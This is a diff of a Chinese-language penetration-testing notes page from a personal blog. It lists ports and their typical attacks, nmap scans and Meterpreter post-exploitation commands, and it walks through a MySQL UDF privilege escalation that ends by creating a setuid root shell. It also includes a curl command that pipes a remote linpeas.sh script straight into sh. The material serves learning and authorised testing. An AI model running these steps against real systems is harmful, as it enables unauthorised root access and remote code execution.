+<td align="center">爆破/未授权访问/远程命令执行</td>
+</tr>
+<tr>
+<td align="center">143</td>
+<td align="center">Imap协议</td>
+<td align="center">爆破</td>
+</tr>
+<tr>
+<td align="center">161</td>
+<td align="center">SNMP协议</td>
+<td align="center">爆破/搜集目标内网信息</td>
+</tr>
+<tr>
+<td align="center">389</td>
+<td align="center">Ldap目录访问协议</td>
+<td align="center">注入/未授权访问/弱口令</td>
+</tr>
+<tr>
+<td align="center">445</td>
+<td align="center">smb</td>
+<td align="center">ms17-010/端口溢出</td>
+</tr>
+<tr>
+<td align="center">512/513/514</td>
+<td align="center">Linux Rexec服务</td>
+<td align="center">爆破/Rlogin登陆</td>
+</tr>
+<tr>
+<td align="center">873</td>
+<td align="center">Rsync服务</td>
+<td align="center">文件上传/未授权访问</td>
+</tr>
+<tr>
+<td align="center">1080</td>
+<td align="center">socket</td>
+<td align="center">爆破</td>
+</tr>
+<tr>
+<td align="center">1352</td>
+<td align="center">Lotus domino邮件服务</td>
+<td align="center">爆破/信息泄漏</td>
+</tr>
+<tr>
+<td align="center">1433</td>
+<td align="center">mssql</td>
+<td align="center">爆破/注入/SA弱口令</td>
+</tr>
+<tr>
+<td align="center">1521</td>
+<td align="center">oracle</td>
+<td align="center">爆破/注入/TNS爆破/反弹shell</td>
+</tr>
+<tr>
+<td align="center">2049</td>
+<td align="center">Nfs服务</td>
+<td align="center">配置不当</td>
+</tr>
+<tr>
+<td align="center">2181</td>
+<td align="center">zookeeper服务</td>
+<td align="center">未授权访问</td>
+</tr>
+<tr>
+<td align="center">2375</td>
+<td align="center">docker remote api</td>
+<td align="center">未授权访问</td>
+</tr>
+<tr>
+<td align="center">3306</td>
+<td align="center">mysql</td>
+<td align="center">爆破/注入</td>
+</tr>
+<tr>
+<td align="center">3389</td>
+<td align="center">Rdp远程桌面链接</td>
+<td align="center">爆破/shift后门</td>
+</tr>
+<tr>
+<td align="center">4848</td>
+<td align="center">GlassFish控制台</td>
+<td align="center">爆破/认证绕过</td>
+</tr>
+<tr>
+<td align="center">5000</td>
+<td align="center">sybase/DB2数据库</td>
+<td align="center">爆破/注入/提权</td>
+</tr>
+<tr>
+<td align="center">5432</td>
+<td align="center">postgresql</td>
+<td align="center">爆破/注入/缓冲区溢出</td>
+</tr>
+<tr>
+<td align="center">5632</td>
+<td align="center">pcanywhere服务</td>
+<td align="center">抓密码/代码执行</td>
+</tr>
+<tr>
+<td align="center">5900</td>
+<td align="center">vnc</td>
+<td align="center">爆破/认证绕过</td>
+</tr>
+<tr>
+<td align="center">6379</td>
+<td align="center">Redis数据库</td>
+<td align="center">未授权访问/爆破</td>
+</tr>
+<tr>
+<td align="center">7001/7002</td>
+<td align="center">weblogic</td>
+<td align="center">java反序列化/控制台弱口令</td>
+</tr>
+<tr>
+<td align="center">80/443</td>
+<td align="center">http/https</td>
+<td align="center">web应用漏洞/心脏滴血</td>
+</tr>
+<tr>
+<td align="center">8069</td>
+<td align="center">zabbix服务</td>
+<td align="center">远程命令执行/注入</td>
+</tr>
+<tr>
+<td align="center">8161</td>
+<td align="center">activemq</td>
+<td align="center">弱口令/写文件</td>
+</tr>
+<tr>
+<td align="center">8080/8089</td>
+<td align="center">Jboss/Tomcat/Resin</td>
+<td align="center">爆破/PUT文件上传/反序列化</td>
+</tr>
+<tr>
+<td align="center">8083/8086</td>
+<td align="center">influxDB</td>
+<td align="center">未授权访问</td>
+</tr>
+<tr>
+<td align="center">9000</td>
+<td align="center">fastcgi</td>
+<td align="center">远程命令执行</td>
+</tr>
+<tr>
+<td align="center">9090</td>
+<td align="center">Websphere控制台</td>
+<td align="center">爆破/java反序列化/弱口令</td>
+</tr>
+<tr>
+<td align="center">9200/9300</td>
+<td align="center">elasticsearch</td>
+<td align="center">远程代码执行</td>
+</tr>
+<tr>
+<td align="center">11211</td>
+<td align="center">memcached</td>
+<td align="center">未授权访问</td>
+</tr>
+<tr>
+<td align="center">27017/27018</td>
+<td align="center">mongodb</td>
+<td align="center">未授权访问/爆破</td>
+</tr>
+</tbody></table>
+<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">telnet xxx.xxx.xxx.xxx</span><br><span class="line"><span class="comment">#有时候有些账户不需要密码</span></span><br></pre></td></tr></table></figure>
+
+
+
 <h1 id="Nmap的使用"><a href="#Nmap的使用" class="headerlink" title="Nmap的使用"></a>Nmap的使用</h1><h2 id="扫描目标主机"><a href="#扫描目标主机" class="headerlink" title="扫描目标主机"></a>扫描目标主机</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描单个对象</span></span><br><span class="line">nmap 10.168.1.190</span><br><span class="line"><span class="comment"># 扫描多个对象</span></span><br><span class="line">nmap 10.168.1.190 10.168.1.121</span><br><span class="line">nmap 10.168.1.1-100</span><br><span class="line"><span class="comment"># 扫描目标地址所在的某个网段</span></span><br><span class="line">nmap 10.168.1.1/24</span><br><span class="line"><span class="comment"># 扫描目标主机所在C段的存活</span></span><br><span class="line">nmap -sP 10.168.1.190/24</span><br><span class="line"><span class="comment"># 探测目标主机的防火墙状态</span></span><br><span class="line">nmap 127.0.0.1 -sF -T4</span><br></pre></td></tr></table></figure>
 
 <h2 id="从文件读入待扫描的主机或网络列表"><a href="#从文件读入待扫描的主机或网络列表" class="headerlink" title="从文件读入待扫描的主机或网络列表"></a>从文件读入待扫描的主机或网络列表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> inputfile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;192.168.x.x&#x27;</span> &gt; inputfile</span><br><span class="line">nmap -iL inputfile</span><br></pre></td></tr></table></figure>
@@ -209,11 +422,22 @@
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#检查是否运行在虚拟机上</span><br><span class="line">run post/windows/gather/checkvm</span><br><span class="line">#关闭杀毒软件 </span><br><span class="line">run post/windows/gather/checkvm</span><br><span class="line">#查看登录的用户</span><br><span class="line">run post/windows/gather/enum_logged_on_users</span><br><span class="line">#获取桌面截图</span><br><span class="line">load espia</span><br><span class="line">screengrab</span><br></pre></td></tr></table></figure>
 
+<h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h2 id="MySQL-UDF提权"><a href="#MySQL-UDF提权" class="headerlink" title="MySQL-UDF提权"></a>MySQL-UDF提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">searchsploit mysql udf -m 1518</span><br><span class="line"> * Usage:</span><br><span class="line"> * $ <span class="built_in">id</span></span><br><span class="line"> * uid=500(raptor) gid=500(raptor) <span class="built_in">groups</span>=500(raptor)</span><br><span class="line"> * $ gcc -g -c raptor_udf2.c</span><br><span class="line"> * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line"> * $ mysql -u root -p</span><br><span class="line"> * Enter password:</span><br><span class="line"> * [...]</span><br><span class="line"> * mysql&gt; use mysql;</span><br><span class="line"> * mysql&gt; create table foo(line blob);</span><br><span class="line"> * mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/tmp/raptor_udf2.so&#x27;</span>));</span><br><span class="line"> * mysql&gt; select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;</span><br><span class="line"> * mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line"> * mysql&gt; select do_system(<span class="string">&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;</span>);</span><br><span class="line"> * /tmp/rootbash -</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="信息扫描工具"><a href="#信息扫描工具" class="headerlink" title="信息扫描工具"></a>信息扫描工具</h1><h2 id="PEASS-ng"><a href="#PEASS-ng" class="headerlink" title="PEASS-ng"></a>PEASS-ng</h2><p>支持Windows、MacOS、Linux</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20231002-59c6f6e6/linpeas.sh | sh</span><br><span class="line"><span class="comment"># -L 是跟踪重定向</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://goodlunatic.github.io/2023/09/20/Penetration%20Testing%20Knowledge/" data-id="clncln070002a2s3z1ia4cto6" class="article-share-link">Share</a>
+      <a data-url="https://goodlunatic.github.io/2023/10/06/Penetration%20Testing/" data-id="clnfcbsmj002blo3z9b9xaiak" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Skills/" rel="tag">Skills</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
@@ -224,19 +448,19 @@
   
 <nav id="article-nav">
   
-    <a href="/2023/09/20/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E5%9C%A8Web%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2023/10/06/Python%20Learning%20Record/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          侧信道攻击在Web安全中的应用
+          Python Learning Record
         
       </div>
     </a>
   
   
-    <a href="/2023/09/12/Vue-Basic/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2023/10/05/PHP%20Basic%20and%20Vulnerability/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Vue-Basic</div>
+      <div class="article-nav-title">PHP Basic and Vulnerability</div>
     </a>
   
 </nav>
@@ -271,7 +495,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -284,6 +508,14 @@
       <ul>
         
           <li>
+            <a href="/2023/10/06/Python%20Learning%20Record/">Python Learning Record</a>
+          </li>
+        
+          <li>
+            <a href="/2023/10/06/Penetration%20Testing/">Penetration Testing</a>
+          </li>
+        
+          <li>
             <a href="/2023/10/05/PHP%20Basic%20and%20Vulnerability/">PHP Basic and Vulnerability</a>
           </li>
         
@@ -293,14 +525,6 @@
         
           <li>
             <a href="/2023/10/01/Docker%20Learning%20Record/">Docker Learning Record</a>
-          </li>
-        
-          <li>
-            <a href="/2023/10/01/Misc%E2%80%94%E2%80%94Forensics/">Misc——Forensics</a>
-          </li>
-        
-          <li>
-            <a href="/2023/09/28/Network%20Traffic%20Analysis/">Network Traffic Analysis</a>
           </li>
         
       </ul>
